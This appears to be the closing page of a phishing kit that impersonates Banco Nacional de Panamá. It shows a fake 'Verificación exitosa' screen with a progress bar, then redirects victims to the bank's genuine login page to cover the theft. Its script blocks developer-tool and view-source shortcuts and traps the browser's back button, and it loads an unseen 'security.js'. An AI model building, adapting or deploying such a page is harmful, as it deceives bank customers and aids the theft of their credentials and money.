<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Verificación Exitosa</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<link rel="shortcut icon" href="assets/index_files/images/41.ico">

<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    position: relative;
    padding: 20px;
    padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    color: #333;
    -webkit-tap-highlight-color: transparent;
  }

  /* ==========================================
     LOGO — el mismo que usa index.php
     (assets/index_files/images/24.png)
     ========================================== */
  .logo-wrap {
    position: absolute;
    top: 40px;
    left: 50%;
    transform: translateX(-50%);
    width: 100%;
    display: flex;
    justify-content: center;
  }

  .logo-wrap img {
    width: 190px;
    max-width: 60%;
    height: auto;
    display: block;
    object-fit: contain;
    user-select: none;
    -webkit-user-drag: none;
    pointer-events: none;
  }

  /* TARJETA CENTRAL */
  .card {
    max-width: 360px;
    width: 100%;
    text-align: center;
    animation: fadeUp 0.6s ease both;
  }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(15px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  /* CHECK VERDE */
  .check-svg {
    width: 90px;
    height: 90px;
    margin: 0 auto 20px;
    display: block;
  }

  .check-svg circle {
    fill: none;
    stroke: #25d366;
    stroke-width: 3;
    stroke-dasharray: 302;
    stroke-dashoffset: 302;
    animation: drawCircle 0.8s ease-out forwards;
    transform-origin: center;
    transform: rotate(-90deg);
  }

  .check-svg path {
    fill: none;
    stroke: #25d366;
    stroke-width: 5;
    stroke-linecap: round;
    stroke-linejoin: round;
    stroke-dasharray: 60;
    stroke-dashoffset: 60;
    animation: drawCheck 0.5s ease-out 0.6s forwards;
  }

  @keyframes drawCircle { to { stroke-dashoffset: 0; } }
  @keyframes drawCheck  { to { stroke-dashoffset: 0; } }

  /* TEXTO */
  .title {
    font-size: 20px;
    font-weight: 700;
    color: #1a2036;
    margin-bottom: 26px;
    animation: fadeIn 0.5s ease 0.9s both;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(6px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  /* BARRA DE PROGRESO */
  .progress-track {
    width: 100%;
    height: 5px;
    background: #e9ecef;
    border-radius: 999px;
    overflow: hidden;
    animation: fadeIn 0.5s ease 1.1s both;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    background: #25d366;
    border-radius: 999px;
  }

  /* RESPONSIVE */
  @media (max-height: 700px) {
    .logo-wrap { top: 25px; }
    .logo-wrap img { width: 150px; }
    .check-svg { width: 76px; height: 76px; margin-bottom: 16px; }
    .title { font-size: 18px; margin-bottom: 22px; }
  }

  @media (max-height: 560px) {
    .logo-wrap { top: 15px; }
    .logo-wrap img { width: 120px; }
    .check-svg { width: 60px; height: 60px; margin-bottom: 12px; }
    .title { font-size: 16px; margin-bottom: 18px; }
  }
</style>
</head>
<body>

  <!-- LOGO — el mismo del index.php (modo light_box) -->
  <div class="logo-wrap">
    <img src="assets/index_files/images/24.png" alt="Banco Nacional de Panamá">
  </div>

  <!-- TARJETA CENTRAL -->
  <div class="card">

    <svg class="check-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
      <circle cx="50" cy="50" r="48" />
      <path d="M28 52 L44 68 L72 36" />
    </svg>

    <div class="title">Verificación exitosa</div>

    <div class="progress-track">
      <div class="progress-fill" id="progressFill"></div>
    </div>

  </div>

<script>
  (function () {
    var DURACION_MS = 7000;
    var URL_DESTINO = "https://bnplus.banconal.com.pa/bnplus.UI/#/administrationGeneral/login";

    var fill = document.getElementById('progressFill');
    var inicio = Date.now();
    var redirigido = false;

    function redirigir() {
      if (redirigido) return;
      redirigido = true;
      window.location.href = URL_DESTINO;
    }

    function tick() {
      var transcurrido = Date.now() - inicio;
      var pct = Math.min(100, (transcurrido / DURACION_MS) * 100);

      fill.style.width = pct + '%';

      if (pct >= 100) {
        redirigir();
        return;
      }
      requestAnimationFrame(tick);
    }

    setTimeout(function () {
      inicio = Date.now();
      requestAnimationFrame(tick);
    }, 400);

    // Fallback por si rAF se pausa
    setTimeout(redirigir, DURACION_MS + 800);

    // Bloquear atajos
    document.addEventListener("keydown", function (e) {
      if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s"))) {
        e.preventDefault();
      }
    });

    // Bloquear botón atrás
    (function (global) {
      if (typeof (global) === "undefined") return;
      var _hash = "!";
      var tickHash = function () {
        if (global.location.hash !== _hash) { global.location.hash = _hash; }
        global.history.pushState(null, null, global.location.href);
      };
      global.onload = function () { tickHash(); };
      global.setInterval(function () { tickHash(); }, 500);
      global.onpopstate = function () { global.history.go(1); };
    })(window);
  })();
</script>

<script src="security.js"></script>
</body>
</html>